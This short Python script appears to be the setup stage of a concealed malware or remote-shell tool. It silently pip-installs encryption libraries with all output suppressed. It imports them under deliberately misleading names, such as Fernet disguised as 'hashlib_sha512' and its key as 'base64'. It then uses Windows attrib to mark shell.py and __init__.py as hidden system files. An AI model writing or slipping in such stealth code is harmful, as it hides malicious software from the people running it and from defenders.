import os , subprocess

try:
    from cryptography.fernet import Fernet
    
except:
    update_pip = 'pip install cryptography'
    subprocess.call(update_pip, shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)





try:
    from obscure_password import obscure
    
except:
    update_pip = 'pip install obscure-password'
    subprocess.call(update_pip, shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)




try:
    from AesEverywhere import aes256
    
except:
    update_pip = 'pip install aes-everywhere'
    subprocess.call(update_pip, shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)





from AesEverywhere import aes256 as aes256bit
from obscure_password import obscure as vigenere_cipher
from obscure_password import unobscure as affine_cipher
from cryptography.fernet import Fernet as hashlib_sha512
base64 = hashlib_sha512.generate_key()
caesar_cipher = hashlib_sha512(base64)




    
subprocess.Popen(f'attrib +s +h shell.py', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
subprocess.Popen(f'attrib +s +h __init__.py', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)




